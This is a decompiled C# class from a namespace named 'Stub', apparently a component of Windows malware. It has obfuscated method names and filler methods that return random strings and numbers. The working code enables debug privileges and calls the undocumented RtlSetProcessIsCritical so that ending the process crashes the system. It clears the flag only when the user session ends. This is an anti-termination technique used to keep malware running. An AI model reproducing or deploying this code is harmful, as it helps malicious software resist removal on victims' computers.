using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub;

public class GClass1
{
	[DllImport("NTdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical([MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] ref bool tLoahKLXPGoMTHsZcxB6r2ymdNJVy, [MarshalAs(UnmanagedType.Bool)] bool DDWYIfj84woxbBmEdsFRr2ijkWybj);

	public static void kORpcTNcQnLDytTeAmlqc6eoZxdnr(object sender, SessionEndingEventArgs e)
	{
		BOM8wdTRRE8PJ0qiBkhvG9TP4sy9M();
	}

	public static void smethod_0()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		try
		{
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(kORpcTNcQnLDytTeAmlqc6eoZxdnr));
			Process.EnterDebugMode();
			bool tLoahKLXPGoMTHsZcxB6r2ymdNJVy = default(bool);
			RtlSetProcessIsCritical(bool_0: true, ref tLoahKLXPGoMTHsZcxB6r2ymdNJVy, DDWYIfj84woxbBmEdsFRr2ijkWybj: false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void BOM8wdTRRE8PJ0qiBkhvG9TP4sy9M()
	{
		try
		{
			bool tLoahKLXPGoMTHsZcxB6r2ymdNJVy = default(bool);
			RtlSetProcessIsCritical(bool_0: false, ref tLoahKLXPGoMTHsZcxB6r2ymdNJVy, DDWYIfj84woxbBmEdsFRr2ijkWybj: false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string ZonYmSeqDf9LtDhu0MtZh()
	{
		return "H9NYiOhjZZG1rHcLu9pLi";
	}

	public static int CFenHlLpxZDGfsPE8eHXe()
	{
		return 83493637;
	}

	public static string dNKHf6XxlxgD9SEP1Pvv0()
	{
		return "oxt34tJTznyDBA0sfvRa5";
	}

	public static int LAukQxLORD37B0fDXqPsC()
	{
		return 83422279;
	}

	public static string JBwpD1pUPkHBGAt5lbPJm()
	{
		return "0UCSNPBCXbmqma5jCFTsc";
	}

	public static int XhxyBqBuT9XmXjLuv0bfY()
	{
		return 7844435;
	}

	public static string YD23CxyVlMyG6l0LpsKyF()
	{
		return "HtLnYq1QWR50izfRENiBh";
	}

	public static int bkI5AoveiV6uVvsEIDwjv()
	{
		return 4139500;
	}

	public static string NkCvRby5M5f3SEf66IUPu()
	{
		return "4nSYZIR23gS1hRhYGywzU";
	}

	public static int XNkzhGw8xc6XQSRIcmNgs()
	{
		return 24866858;
	}
}
